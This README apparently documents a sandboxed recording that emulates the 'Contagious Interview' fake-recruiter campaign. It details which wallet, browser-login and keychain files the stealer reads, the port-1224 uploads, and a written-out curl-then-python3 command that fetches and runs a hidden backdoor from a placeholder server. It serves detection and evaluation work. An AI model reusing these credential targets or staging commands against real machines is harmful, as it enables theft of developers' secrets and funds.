# Contagious Interview

The fake-recruiter campaign that has run since 2023 (also tracked as
DeceptiveDevelopment; attributed to North Korea): a developer is offered a
job or a freelance contract and sent a take-home project, a repository on
GitHub, GitLab or Bitbucket. Hidden in its backend code is a JavaScript
stealer (BeaverTail) that runs when the project does, takes wallet, browser
and keychain files, and fetches a Python backdoor (InvisibleFerret).

The recording is of a developer's Mac (a VM) where the person clones the
project, installs its dependencies and runs its tests in their Terminal, and
of nothing else they do.

## What happens in the recording

| step | what the sensor sees | from the write-ups |
|---|---|---|
| 1 | `git clone` of the project from the recruiter's host, `npm install` (one real dependency, Express), `npm test`, which starts `node test/smoke.js` | Unit 42, ESET: a repository the person is asked to build and run |
| 2 | that `node` reads the wallet extensions' stores in each Chrome, Brave and Opera profile, each profile's `Login Data`, `~/.config/solana/id.json`, `~/Library/Keychains/login.keychain-db`, and Firefox's `key4.db` and `logins.json` | ESET (the list, and the Firefox files taken only where the keychain is found), Unit 42 (the extension ids, the Solana file) |
| 3 | `node` POSTs to the attacker's server on port 1224, path `/uploads`, by plain HTTP | Unit 42, ESET |
| 4 | `node` starts `curl -Lo ~/.nvc http://<server>:1224/client/7`: the next stage, a Python script in a hidden file in the home directory | Unit 42 (`/client/<campaign id>`, saved as a hidden file in the home), Socket (fetched with curl) |
| 5 | `node` starts `python3 ~/.nvc`, which makes the hidden directory `~/.c3`, downloads `/payload/7` into it as `run`, starts that with the same Python in a session of its own, and exits | Unit 42, ESET: the first script fetches the backdoor into a hidden directory and runs it; on macOS it stops there |
| 6 | `python ~/.c3/run` runs `python -m pip install requests` | Unit 42: it installs the pip modules it lacks |
| 7 | it connects to `ip-api.com` on port 80 | ESET: the machine's public address and location, from that service |
| 8 | it POSTs to the server on port 1224, path `/keys` | Unit 42, ESET: the machine's fingerprint |
| 9 | it connects to the server on port 1245 and holds the connection for two minutes, after `npm test` has returned | ESET: the command connection, usually on 1245 |

`twin.sh` is the same kinds of acts by the person on their own work: a real
project cloned from GitHub (`expressjs/cors`), its dependencies installed and
its tests run, and their public address looked up at `ip-api.com` with
`curl`.

## What is real and what is stood in

Real: every program and its parent (`git`, `npm`, `node`, `sh`, `curl`,
`python3`, `pip`), the files opened and written, the connection to
`ip-api.com`, the ports.

Stood in:

- **The recruiter's host.** `git.acme-hire.example` in the VM is
  [`standin/registry.py`](../../standin/registry.py) on the host, serving
  [`repo/`](repo) as a git repository of one commit. In the campaign the
  repository is on GitHub, GitLab or Bitbucket, usually private.
- **The attacker's server.** `cdn.shop-metrics.example` in the VM is the same
  stand-in. It answers `/client/7` with [`client.py`](client.py) and
  `/payload/7` with [`payload.py`](payload.py), and 200 with nothing to
  everything else. The campaign's servers are bare IP addresses; here it is a
  name, because the stand-in is reached by name.
- **What is sent.** Every file in step 2 is read and its content dropped. The
  upload is filler of the same length; the fingerprint is 512 bytes of
  filler; the answer from `ip-api.com` is dropped.
- **The command connection.** Nothing is sent or read on it and no command is
  taken.
- **The files it reads.** The browser and wallet files on the VM are random
  bytes under the right names (`vm/provision.sh`); the login keychain is the
  VM's own, of a user made for the recording.
- **The names.** The project, the hosts, the hidden file and directory
  (`~/.nvc`, `~/.c3/run`) and the campaign id are made up; the campaign's own
  are not used, so that nothing is caught by a name. The extension ids are
  the wallets' own public ones, and the ports are the campaign's.
- **Where the stealer sits.** In the campaign it is one long line at the end
  of a backend file, its strings hidden. Here it is a file of its own
  ([`repo/server/config/settings.js`](repo/server/config/settings.js)),
  plain, loaded by the app.

Not in the recording:

- **The editor route**, where opening the folder in VS Code is enough. It
  is a case of its own: [`contagious-interview-task`](../contagious-interview-task).
- **What the backdoor did on command.** Shell commands, uploads of the home
  directory and `/Volumes` by FTP, `killall` of the browsers, AnyDesk. No
  write-up says which commands the operators sent to any one Mac, so none is
  invented.
- **The browser stealer part.** The first Python script does not fetch it on
  macOS; it comes later, on command.
- **Python itself.** On Windows the stealer downloads a Python (`/pdown`);
  a Mac with the developer tools has one.
- The obfuscation, and the Windows and Linux branches.

The payload runs only on a recording VM (`/etc/tangent-eval-vm`, and a
`cdn.shop-metrics.example` that resolves to a private address) and exits at
once anywhere else.

## Needs in the VM

Nothing that `vm/provision.sh` does not give. The recording leaves `~/.nvc`,
`~/.c3` and `~/code/shop-demo` behind, and the twin `~/code/cors`; each is
made on a fresh copy of the VM.

## Sources

See [`case.json`](case.json).
